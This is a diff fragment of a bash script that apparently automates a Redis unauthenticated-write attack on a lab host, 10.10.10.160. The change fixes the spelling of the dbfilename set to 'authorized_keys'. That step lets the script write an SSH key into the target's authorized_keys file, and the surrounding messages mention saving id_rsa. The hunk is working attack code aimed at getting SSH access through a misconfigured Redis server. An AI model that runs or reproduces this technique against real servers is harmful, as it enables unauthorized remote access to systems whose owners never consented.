@@ -47,7 +47,7 @@ else
   echo "\e[00;91m[-] Database Error:\e[00m\n"
 fi
 
-value4=$( redis-cli -h 10.10.10.160 config set dbfilename autorized_keys )
+value4=$( redis-cli -h 10.10.10.160 config set dbfilename "authorized_keys" )
 if [ $value4 = OK ]
 then
   echo "\e[00;92m[+]\e[00m Saving id_rsa"
